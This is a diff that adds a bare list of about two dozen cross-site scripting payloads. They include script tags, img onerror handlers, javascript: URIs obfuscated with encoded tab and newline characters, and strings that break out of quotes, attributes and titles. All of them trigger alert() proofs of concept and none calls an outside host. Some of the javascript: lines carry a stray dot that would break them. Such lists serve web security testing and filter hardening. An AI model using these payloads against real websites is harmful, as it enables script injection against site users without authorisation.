@@ -1,0 +1,23 @@
+<script>alert(1)</script>  
+<script>alert(2)</script>
+<script>alert(11);</script> 
+>"'><img src="javascript.:alert(12)">
+>"'><script>alert(13)</script>
+<table background='javascript.:alert(14)'></table>
+<object type=text/html data='javascript.:alert(15);'></object>
+"+alert(16)+"
+"/><script>alert('zeroday')</script>//
+");</script><script>alert("zero")</script>//
+</title><script>alert("zero")</script>//
+')</script><script>alert(1)</script>//
+<body/onfocus=top.alert(17)>
+<img/src=22 onerror=window.alert(22)>
+<img src=62 onerror=(function(){alert(62)})()>
+<img src=63 onerror=!function(){alert(63)}()>
+<script>alert(231)</script>
+a.jsp/<script>alert(232)</script>
+"><script>alert(233)</script>
+<IMG SRC="javascript.:alert(234);">
+<IMG SRC="jav&#x09;ascript.:alert(238);">
+<IMG SRC="jav&#x0A;ascript.:alert(239);">
+<IMG SRC="jav&#x0D;ascript.:alert(240);">
